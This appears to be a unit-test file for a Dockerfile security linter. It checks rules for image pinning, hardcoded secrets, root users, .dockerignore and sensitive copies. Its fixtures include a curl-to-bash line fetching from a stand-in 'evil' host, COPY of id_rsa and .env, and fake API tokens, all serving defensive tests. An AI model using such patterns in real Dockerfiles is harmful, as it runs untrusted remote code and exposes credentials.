"""Rule tests: every rule fires on its pattern and stays quiet on clean input."""

import unittest

from dockseal.parser import parse_dockerfile
from dockseal.rules import (
    run_all_rules, check_from_pinning, check_secrets_env, check_secrets_run,
    check_user, check_dockerignore, check_sensitive_copy, mask,
)

IDS = lambda findings: sorted({f.rule_id for f in findings})


class TestPinning(unittest.TestCase):
    def test_latest_and_untagged(self):
        ins = parse_dockerfile("FROM python:latest\nFROM alpine\n")
        self.assertEqual(IDS(check_from_pinning(ins)), ["DS-001"])

    def test_tag_only_is_medium(self):
        ins = parse_dockerfile("FROM python:3.12-slim\n")
        f = check_from_pinning(ins)
        self.assertEqual(f[0].rule_id, "DS-002")
        self.assertEqual(f[0].severity, "MEDIUM")

    def test_digest_pinned_clean(self):
        d = "@sha256:" + "a" * 64
        ins = parse_dockerfile(f"FROM python:3.12-slim{d}\n")
        self.assertEqual(check_from_pinning(ins), [])

    def test_scratch_not_flagged(self):
        ins = parse_dockerfile("FROM scratch\n")
        self.assertEqual(check_from_pinning(ins), [])

    def test_platform_prefix(self):
        ins = parse_dockerfile("FROM --platform=$BUILDPLATFORM golang:1.22 AS build\n")
        self.assertEqual(IDS(check_from_pinning(ins)), ["DS-002"])


class TestSecretsEnv(unittest.TestCase):
    def test_env_literal_secret(self):
        ins = parse_dockerfile("ENV OPENAI_API_KEY=sk-0123456789abcdef0123\n")
        f = check_secrets_env(ins)
        self.assertEqual(f[0].rule_id, "DS-003")
        self.assertEqual(f[0].severity, "CRITICAL")

    def test_arg_placeholder_ok(self):
        ins = parse_dockerfile("ARG GITHUB_TOKEN=${CI_TOKEN}\nENV AWS_SECRET_ACCESS_KEY=\n")
        self.assertEqual(check_secrets_env(ins), [])

    def test_non_secret_env_ok(self):
        ins = parse_dockerfile("ENV PATH=/usr/local/bin:/usr/bin\nENV APP_NAME=dockseal\n")
        self.assertEqual(check_secrets_env(ins), [])

    def test_secret_evidence_masked(self):
        ins = parse_dockerfile("ENV OPENAI_API_KEY=sk-0123456789abcdef0123\n")
        ev = check_secrets_env(ins)[0].evidence
        self.assertNotIn("0123456789abcdef0123", ev)
        self.assertIn("<masked>", ev)


class TestSecretsRun(unittest.TestCase):
    def test_hardcoded_token_in_run(self):
        ins = parse_dockerfile("RUN echo \"token=ghp_0123456789abcdef0123456789\" >> /cfg\n")
        f = check_secrets_run(ins)
        self.assertIn("DS-004", IDS(f))
        self.assertNotIn("0123456789abcdef0123", " ".join(x.evidence for x in f))

    def test_pipe_to_shell(self):
        ins = parse_dockerfile("RUN curl -sSL https://get.evil.example | bash\n")
        self.assertIn("DS-005", IDS(check_secrets_run(ins)))

    def test_plain_curl_ok(self):
        ins = parse_dockerfile("RUN curl -fsSL https://example.com/file.tar.gz -o /tmp/f.tar.gz\n")
        self.assertEqual(check_secrets_run(ins), [])

    def test_wget_sh_c_ok(self):
        ins = parse_dockerfile("RUN wget -q https://example.com/install.sh -O /tmp/i.sh\n")
        self.assertEqual(check_secrets_run(ins), [])


class TestUser(unittest.TestCase):
    def test_no_user_flagged(self):
        ins = parse_dockerfile("FROM alpine:3.20\nRUN echo hi\n")
        f = check_user(ins)
        self.assertEqual(f[0].rule_id, "DS-006")

    def test_stage_1_builder_rootiness_ignored(self):
        text = ("FROM golang:1.22 AS builder\nRUN go build\n"
                "FROM alpine:3.20\nUSER app\n")
        self.assertEqual(check_user(parse_dockerfile(text)), [])

    def test_trailing_root_user_flagged(self):
        text = "FROM alpine:3.20\nUSER 0\n"
        self.assertEqual(check_user(parse_dockerfile(text))[0].rule_id, "DS-006")


class TestMisc(unittest.TestCase):
    def test_dockerignore_missing(self):
        ins = parse_dockerfile("FROM alpine:3.20\n")
        self.assertEqual(check_dockerignore(ins, False)[0].rule_id, "DS-008")
        self.assertEqual(check_dockerignore(ins, True), [])
        self.assertEqual(check_dockerignore(ins, None), [])

    def test_sensitive_copy(self):
        ins = parse_dockerfile("COPY id_rsa /root/.ssh/id_rsa\nCOPY .env /app/.env\n")
        f = check_sensitive_copy(ins)
        self.assertEqual(len(f), 2)
        self.assertEqual(f[0].rule_id, "DS-009")

    def test_clean_copy_ok(self):
        ins = parse_dockerfile("COPY --chown=app:app ./src /app/src\n")
        self.assertEqual(check_sensitive_copy(ins), [])


class TestMask(unittest.TestCase):
    def test_mask_keeps_prefix(self):
        masked = mask("sk-0123456789abcdef")
        self.assertTrue(masked.startswith("sk-0"))


if __name__ == "__main__":
    unittest.main()
